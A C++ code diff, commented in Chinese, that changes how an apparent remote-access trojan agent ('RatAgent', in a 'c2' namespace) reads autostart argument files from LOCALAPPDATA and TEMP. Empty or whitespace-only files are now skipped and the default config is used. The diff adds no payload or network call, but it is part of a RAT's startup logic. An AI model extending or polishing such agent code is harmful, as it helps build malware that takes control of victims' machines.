@@ -665,6 +665,11 @@ namespace c2
     {
         // 依次探测：LOCALAPPDATA\RatAgent\<module>.autostart.args →
         //           %TEMP%\RatAgent\<module>.autostart.args
+        //
+        // 语义：**只有"文件存在且内容非空"才算触发**。
+        //   文件不存在 / 读失败 / 内容为空（或全空白） → 都视为"未触发"，
+        //   由调用方走内置默认配置（见 agent_dll.cpp 的 autostart_proc）。
+        //   空文件继续探测下一个候选，避免一个空文件把后面真正有参数的挡掉。
         std::vector<std::string> cands;
         cands.push_back(agent_autostart_path());
         std::wstring tmp = env_wide(L"TEMP");
@@ -679,11 +684,25 @@ namespace c2
         }
         for (const auto& c : cands)
         {
-            if (!c.empty() && read_file_utf8(c, args))
+            if (c.empty())
+                continue;
+            std::string content;
+            if (!read_file_utf8(c, content))
+                continue;   // 不存在 / 读失败 → 与"空"同样处理
+            // 去掉首尾空白（空格/Tab）：只剩空白也按"空"处理
+            size_t b = content.find_first_not_of(" \t");
+            size_t e = content.find_last_not_of(" \t");
+            content = (b == std::string::npos) ? std::string()
+                                               : content.substr(b, e - b + 1);
+            if (content.empty())
             {
-                AGENT_LOG("[*] autostart trigger: %s -> args=\"%s\"\n", c.c_str(), args.c_str());
-                return true;
+                AGENT_LOG("[*] autostart: %s is empty -> treated as no trigger (use default config)\n",
+                    c.c_str());
+                continue;
             }
+            args = content;
+            AGENT_LOG("[*] autostart trigger: %s -> args=\"%s\"\n", c.c_str(), args.c_str());
+            return true;
         }
         return false;
     }
